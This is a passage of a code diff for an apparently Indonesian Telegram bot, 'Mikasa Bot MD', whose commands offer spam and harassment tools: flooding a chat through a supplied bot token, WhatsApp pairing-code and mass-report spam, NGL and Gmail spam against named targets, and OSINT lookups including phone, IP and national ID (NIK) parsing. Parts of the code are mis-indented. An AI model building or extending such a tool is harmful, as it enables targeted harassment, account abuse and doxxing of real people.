+                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌\n"
+                f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
+                f"/spambottele token idchat pesan"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    token = args[0].strip()
+    chat_id_target = args[1].strip()
+    pesan = ' '.join(args[2:])
+    
+    update.message.reply_text(format_loading("Mengirim Spam Bot Telegram"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        success = 0
+        for i in range(10):
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            try:
+                resp = requests.post(url, json={"chat_id": chat_id_target, "text": pesan}, timeout=10)
+                if resp.status_code == 200:
+                    success += 1
+            except:
+                pass
+            time.sleep(0.5)
+        
+        update.message.reply_text(
+            format_success(
+                "𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                f"✅ Berhasil: {success}/10\n📌 Chat ID: `{chat_id_target}`"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+# ===================== CALLBACK HANDLER =====================
+
+ def button_callback(self, update, context):
+    query = update.callback_query
+    query.answer()
     data = query.data
     
     if data == "menu_spam":
-        keyboard = [
-            [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")]]
         caption = (
             f" KATEGORI SPAM\n\n"
             f"╭───〔 1 〕───╮\n"
@@ -6852,20 +8526,18 @@ class MikasaBot:
             f"│ /spamgmail\n"
             f"╰────────────────────────────╯\n\n"
             f"📌 *Cara penggunaan:*\n"
-            f"Ketik command di atas dengan nomor target\n"
-            f"Contoh: /spamotp 628xxxxxxxxx"
+            f"Ketik command di atas dengan nomor target"
         )
-        await query.message.edit_caption(
+        query.message.delete()
+        query.message.reply_photo(
+            photo=SPAM_OTP_IMG,
             caption=caption,
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode=ParseMode.MARKDOWN
         )
     
     elif data == "menu_osint":
-        keyboard = [
-            [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")]]
         caption = (
             f" KATEGORI OSINT & TRACKING\n\n"
             f"╭───〔 2 〕───╮\n"
@@ -6879,20 +8551,18 @@ class MikasaBot:
             f"│ /nikparse\n"
             f"╰────────────────────────────╯\n\n"
             f"📌 *Cara penggunaan:*\n"
-            f"Ketik command di atas dengan target\n"
-            f"Contoh: /osintnomor +628xxxxxxxxx"
+            f"Ketik command di atas dengan target"
         )
-        await query.message.edit_caption(
+        query.message.delete()
+        query.message.reply_photo(
+            photo=IMAGE,
             caption=caption,
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode=ParseMode.MARKDOWN
         )
     
     elif data == "menu_utility":
-        keyboard = [
-            [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")]]
         caption = (
             f" KATEGORI UTILITY\n\n"
             f"╭───〔 3 〕───╮\n"
@@ -6911,20 +8581,18 @@ class MikasaBot:
             f"│ /cekresi\n"
             f"╰────────────────────────────╯\n\n"
             f"📌 *Cara penggunaan:*\n"
-            f"Ketik command di atas dengan target\n"
-            f"Contoh: /cekkodepos 16112"
+            f"Ketik command di atas dengan target"
         )
-        await query.message.edit_caption(
+        query.message.delete()
+        query.message.reply_photo(
+            photo=IMAGE,
             caption=caption,
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode=ParseMode.MARKDOWN
         )
     
     elif data == "menu_all":
-        keyboard = [
-            [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")]]
         caption = (
             f" 𝐌𝐄𝐍𝐔 𝐀𝐋𝐋 𝐌𝐈𝐊𝐀𝐒𝐀\n\n"
             f"╭───〔 ♛♛ 〕───╮\n"
@@ -6961,1263 +8629,34 @@ class MikasaBot:
             f"📌 *Cara penggunaan:*\n"
             f"Ketik command di atas dengan format yang sesuai"
         )
-        await query.message.edit_caption(
+        query.message.delete()
+        query.message.reply_photo(
+            photo=IMAGE,
             caption=caption,
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode=ParseMode.MARKDOWN
         )
     
     elif data == "menu_back":
         keyboard = [
-        [InlineKeyboardButton("〔 1 〕𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔", callback_data="menu_spam")],
-        [InlineKeyboardButton("〔 2 〕𝐎𝐒𝐈𝐍𝐓 & 𝐓𝐀𝐑𝐂𝐊𝐄𝐑", callback_data="menu_osint")],
-        [InlineKeyboardButton("〔 3 〕𝐔𝐓𝐈𝐋𝐈𝐓𝐘", callback_data="menu_utility")],
-        [InlineKeyboardButton("〔 4 〕𝐌𝐄𝐍𝐔 𝐀𝐋𝐋", callback_data="menu_all")],
-        [InlineKeyboardButton("〔 5 〕𝐂𝐋𝐎𝐒𝐄", callback_data="menu_close")],
-    ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+            [InlineKeyboardButton("〔 1 〕𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔", callback_data="menu_spam")],
+            [InlineKeyboardButton("〔 2 〕𝐎𝐒𝐈𝐍𝐓 & 𝐓𝐀𝐑𝐂𝐊𝐄𝐑", callback_data="menu_osint")],
+            [InlineKeyboardButton("〔 3 〕𝐔𝐓𝐈𝐋𝐈𝐓𝐘", callback_data="menu_utility")],
+            [InlineKeyboardButton("〔 4 〕𝐌𝐄𝐍𝐔 𝐀𝐋𝐋", callback_data="menu_all")],
+            [InlineKeyboardButton("〔 5 〕𝐂𝐋𝐎𝐒𝐄", callback_data="menu_close")],
+        ]
         caption = (
             f"𝙈𝙄𝙆𝘼𝙎𝘼 𝘽𝙊𝙏 𝙈𝘿\n"
             f"𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
             f"𝙿𝚒𝚕𝚒𝚑 𝚔𝚊𝚝𝚎𝚐𝚘𝚛𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 👇"
         )
-        await query.message.edit_caption(
+        query.message.delete()
+        query.message.reply_photo(
+            photo=BANNER_URL,
             caption=caption,
-            reply_markup=reply_markup,
+            reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode=ParseMode.MARKDOWN
         )
     
     elif data == "menu_close":
-        await query.message.delete()
-    
-   async def cmd_spam_pair(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = str(update.effective_user.id)
-        if not self.is_verified(user_id):
-            await update.message.reply_text("❌ *Akses Ditolak!*")
-            return
-        
-        args = context.args
-        if not args:
-            await update.message.reply_text(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/spampair 628xxxxxxxxx"
-            )
-            return
-        
-        nomor = args[0].strip()
-        if nomor.startswith('0'):
-            nomor = '62' + nomor[1:]
-        elif nomor.startswith('+62'):
-            nomor = nomor[1:]
-        
-        await update.message.reply_text(format_loading("Mengirim Kode Pairing"))
-        
-        try:
-            success = run_spam_pairing(nomor)
-            await update.message.reply_text(
-                format_success(
-                    "𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    "KETIK /start FOR BACK",
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        except Exception as e:
-            await update.message.reply_text(format_error(str(e)))
-    
-   async def cmd_spam_repwa(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐑𝐄𝐏𝐎𝐑𝐓 𝐖𝐀\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/spamrepwa +628xxxxxxxxx"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    nomor = args[0].strip()
-    await update.message.reply_text(format_loading("Mengirim Spam Report"))
-    
-    try:
-        results = run_spam_report(nomor)
-        detail = "\n".join(results)
-        await update.message.reply_text(
-            format_success(
-                "𝐒𝐏𝐀𝐌 𝐑𝐄𝐏𝐎𝐑𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                f"📱 Target: `{nomor}`\n\n"
-                f"📋 *Detail:*\n{detail}"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_spam_ngl(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐍𝐆𝐋\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/spamngl username"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    username = args[0].strip()
-    await update.message.reply_text(format_loading("Mengirim Spam NGL"))
-    
-    try:
-        success = run_spam_ngl(username)
-        await update.message.reply_text(
-            format_success(
-                "𝐒𝐏𝐀𝐌 𝐍𝐆𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                f"👤 Target: `{username}`\n"
-                f"✅ Berhasil: {success}/20"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_osint(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    await update.message.reply_photo(
-        photo=IMAGE,
-        caption=(
-            f"𝙏𝙊𝙊𝙇𝙎: 𝐎𝐒𝐈𝐍𝐓\n"
-            f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
-            f"𝙋𝙞𝙡𝙞𝙝:\n"
-            f"/osintnomor +628xxxxxxxxx\n"
-            f"/osintusername username\n"
-            f"/osintip 8.8.8.8\n"
-            f"/osintdomain google.com"
-        ),
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-   async def cmd_osint_nomor(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption="Gunakan: /osintnomor +628xxxxxxxxx",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    nomor = args[0].strip()
-    await update.message.reply_text(format_loading("Melakukan OSINT Nomor"))
-    
-    try:
-        info = osint_nomor(nomor)
-        if info:
-            await update.message.reply_text(
-                format_success(
-                    "𝐎𝐒𝐈𝐍𝐓 𝐍𝐎𝐌𝐎𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"📱 Nomor: `{info['nomor']}`\n"
-                    f"✅ Valid: {info['valid']}\n"
-                    f"📌 Negara: {info['negara']}\n"
-                    f"📱 Operator: {info['operator']}\n"
-                    f"🌐 Timezone: {info['timezone']}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text("❌ Gagal OSINT")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_osint_username(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption="Gunakan: /osintusername username",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    username = args[0].strip()
-    await update.message.reply_text(format_loading("Melakukan OSINT Username"))
-    
-    try:
-        found = osint_username(username)
-        if found:
-            msg = f"𝙊𝙎𝙄𝙉𝙏 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 𝙎𝙀𝙇𝙀𝙎𝘼𝙄✅\n\n"
-            for name, url in found:
-                msg += f"✅ {name}: {url}\n"
-            await update.message.reply_text(msg)
-        else:
-            await update.message.reply_text(f"❌ Username `{username}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_osint_ip(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption="Gunakan: /osintip 8.8.8.8",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    ip = args[0].strip()
-    await update.message.reply_text(format_loading("Melakukan OSINT IP"))
-    
-    try:
-        data = osint_ip(ip)
-        if data and data.get('status') == 'success':
-            await update.message.reply_text(
-                format_success(
-                    "𝐎𝐒𝐈𝐍𝐓 𝐈𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🌍 IP: `{data.get('query', 'N/A')}`\n"
-                    f"📍 Negara: {data.get('country', 'N/A')}\n"
-                    f"🏙️ Kota: {data.get('city', 'N/A')}\n"
-                    f"📌 ISP: {data.get('isp', 'N/A')}\n"
-                    f"🌐 Timezone: {data.get('timezone', 'N/A')}\n"
-                    f"🗺️ Google Maps: https://maps.google.com/?q={data.get('lat', '')},{data.get('lon', '')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text("❌ Gagal OSINT IP")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_osint_domain(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption="Gunakan: /osintdomain google.com",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    domain = args[0].strip()
-    await update.message.reply_text(format_loading("Melakukan OSINT Domain"))
-    
-    try:
-        data = osint_domain(domain)
-        if data:
-            whois = data.get('whois', {})
-            await update.message.reply_text(
-                format_success(
-                    "𝐎𝐒𝐈𝐍𝐓 𝐃𝐎𝐌𝐀𝐈𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🌍 Domain: `{data['domain']}`\n"
-                    f"📌 IP: `{data['ip']}`\n"
-                    f"📋 Registrar: {whois.get('registrar', 'N/A')}\n"
-                    f"📅 Created: {whois.get('creation_date', 'N/A')}\n"
-                    f"⏰ Expires: {whois.get('expiration_date', 'N/A')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ Domain `{domain}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_ip_tracker(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/iptracker 8.8.8.8"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    ip = args[0].strip()
-    await update.message.reply_text(format_loading("Melacak IP"))
-    
-    try:
-        data = tool_ip_tracker(ip)
-        if data and data.get('status') == 'success':
-            await update.message.reply_text(
-                format_success(
-                    "𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"━━━ *INFORMASI IP* ━━━\n"
-                    f"🌍 IP: `{data.get('query', 'N/A')}`\n"
-                    f"📍 Negara: {data.get('country', 'N/A')} ({data.get('countryCode', '')})\n"
-                    f"🗺️ Region: {data.get('regionName', 'N/A')}\n"
-                    f"🏙️ Kota: {data.get('city', 'N/A')}\n"
-                    f"📮 Kode Pos: {data.get('zip', 'N/A')}\n"
-                    f"📌 ISP: {data.get('isp', 'N/A')}\n"
-                    f"🏢 Organisasi: {data.get('org', 'N/A')}\n"
-                    f"🌐 Timezone: {data.get('timezone', 'N/A')}\n"
-                    f"📱 Mobile: {'Ya' if data.get('mobile') else 'Tidak'}\n"
-                    f"🔒 Proxy/VPN: {'Ya' if data.get('proxy') else 'Tidak'}\n"
-                    f"🗺️ *Google Maps:* https://maps.google.com/?q={data.get('lat', '')},{data.get('lon', '')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text("❌ Gagal melacak IP")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-    
-   async def cmd_port_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍𝐍𝐄𝐑\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/portscan google.com"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    domain = args[0].strip().replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
-    await update.message.reply_text(format_loading("Scanning Port"))
-    
-    try:
-        result = tool_port_scanner(domain)
-        if result:
-            if result['open_ports']:
-                ports_text = "\n".join([f"🔓 {p['port']} ({p['name']})" for p in result['open_ports']])
-                await update.message.reply_text(
-                    format_success(
-                        "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                        f"🌍 Target: `{domain}`\n"
-                        f"📌 IP: `{result['ip']}`\n"
-                        f"🔓 Port terbuka:\n{ports_text}"
-                    ),
-                    parse_mode=ParseMode.MARKDOWN
-                )
-            else:
-                await update.message.reply_text(
-                    format_success(
-                        "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                        f"🌍 Target: `{domain}`\n"
-                        f"📌 IP: `{result['ip']}`\n"
-                        f"❌ Tidak ada port terbuka"
-                    ),
-                    parse_mode=ParseMode.MARKDOWN
-                )
-        else:
-            await update.message.reply_text("❌ Gagal scan port")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_nik_parse(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐍𝐈𝐊 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/nikparse 3307110101990001"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    nik = args[0].strip()
-    if not nik.isdigit() or len(nik) != 16:
-        await update.message.reply_text("❌ NIK harus 16 digit angka!")
-        return
-    
-    await update.message.reply_text(format_loading("Mengecek NIK"))
-    
-    try:
-        url = f"https://api.nexray.eu.cc/tools/nikparse?nik={nik}"
-        resp = requests.get(url, timeout=10)
-        if resp.status_code == 200:
-            data = resp.json()
-            result = data.get('result', {})
-            
-            msg = (
-                f"📌 NIK: `{nik}`\n"
-                f"👤 Gender: {result.get('kelamin', 'N/A')}\n"
-                f"📅 Lahir: {result.get('lahir_lengkap', 'N/A')}\n"
-                f"📍 Provinsi: {result.get('provinsi', {}).get('nama', 'N/A')}\n"
-                f"🏙️ Kab/Kota: {result.get('kotakab', {}).get('nama', 'N/A')}\n"
-                f"📌 Kecamatan: {result.get('kecamatan', {}).get('nama', 'N/A')}"
-            )
-            await update.message.reply_text(
-                format_success("𝐍𝐈𝐊 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅", msg),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ NIK `{nik}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_cek_kodepos(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐊𝐎𝐃𝐄 𝐏𝐎𝐒\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/cekkodepos 16112"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    kode_pos = args[0].strip()
-    if not kode_pos.isdigit() or len(kode_pos) != 5:
-        await update.message.reply_text("❌ Kode pos harus 5 digit!")
-        return
-    
-    await update.message.reply_text(format_loading("Mencari Kode Pos"))
-    
-    try:
-        data = tool_cek_kode_pos(kode_pos)
-        if data:
-            await update.message.reply_text(
-                format_success(
-                    "𝐊𝐎𝐃𝐄 𝐏𝐎𝐒 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"📮 Kode Pos: `{kode_pos}`\n"
-                    f"📍 Nama: {data.get('nama', 'N/A')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ Kode pos `{kode_pos}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_cek_npsn(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐍𝐏𝐒𝐍\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/ceknpsn 40203594"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    npsn = args[0].strip()
-    if not npsn.isdigit() or len(npsn) != 8:
-        await update.message.reply_text("❌ NPSN harus 8 digit!")
-        return
-    
-    await update.message.reply_text(format_loading("Mencari NPSN"))
-    
-    try:
-        data = tool_cek_npsn(npsn)
-        if data:
-            await update.message.reply_text(
-                format_success(
-                    "𝐍𝐏𝐒𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🏫 Nama: {data.get('nama', 'N/A')}\n"
-                    f"📮 NPSN: {data.get('npsn', 'N/A')}\n"
-                    f"📍 Provinsi: {data.get('provinsi', 'N/A')}\n"
-                    f"🏙️ Kab/Kota: {data.get('kabupaten', 'N/A')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ NPSN `{npsn}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_ff_uid(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐅 𝐔𝐈𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/ffuid 10353221131"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    uid = args[0].strip()
-    if not uid.isdigit():
-        await update.message.reply_text("❌ UID harus angka!")
-        return
-    
-    await update.message.reply_text(format_loading("Mengecek UID Free Fire"))
-    
-    try:
-        data = tool_freefire_checker(uid)
-        if data:
-            await update.message.reply_text(
-                format_success(
-                    "𝐅𝐑𝐄𝐄 𝐅𝐈𝐑𝐄 𝐔𝐈𝐃 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🆔 UID: `{data.get('uid', 'N/A')}`\n"
-                    f"👤 Nama: {data.get('name', 'N/A')}\n"
-                    f"📊 Level: {data.get('level', 'N/A')}\n"
-                    f"🌍 Region: {data.get('region', 'N/A')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ UID `{uid}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_cek_roblox(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐑𝐎𝐁𝐋𝐎𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/cekroblox Builderman"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    username = args[0].strip()
-    await update.message.reply_text(format_loading("Mengecek Akun Roblox"))
-    
-    try:
-        data = tool_roblox_checker(username)
-        if data:
-            basic = data.get('basic', {})
-            await update.message.reply_text(
-                format_success(
-                    "𝐑𝐎𝐁𝐋𝐎𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🆔 ID: `{data.get('userId', 'N/A')}`\n"
-                    f"👤 Username: {basic.get('name', 'N/A')}\n"
-                    f"📅 Created: {basic.get('created', 'N/A')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ Username `{username}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_spam_gmail(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋\n"
-                f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
-                f"/spamgmail target@gmail.com\n"
-                f"/spamgmail target@gmail.com | pesan yang ingin dikirim\n\n"
-                f"📌 Gunakan tanda | sebagai pemisah antara email dan pesan"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    full_text = ' '.join(args)
-    if '|' in full_text:
-        parts = full_text.split('|', 1)
-        target_email = parts[0].strip()
-        custom_message = parts[1].strip() if len(parts) > 1 else None
-    else:
-        target_email = full_text.strip()
-        custom_message = None
-    
-    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target_email):
-        await update.message.reply_text("❌ Format email tidak valid!")
-        return
-    
-    if custom_message and len(custom_message) > 4000:
-        await update.message.reply_text("❌ Pesan terlalu panjang! Maksimal 4000 karakter.")
-        return
-    
-    total_senders = len(get_email_senders())
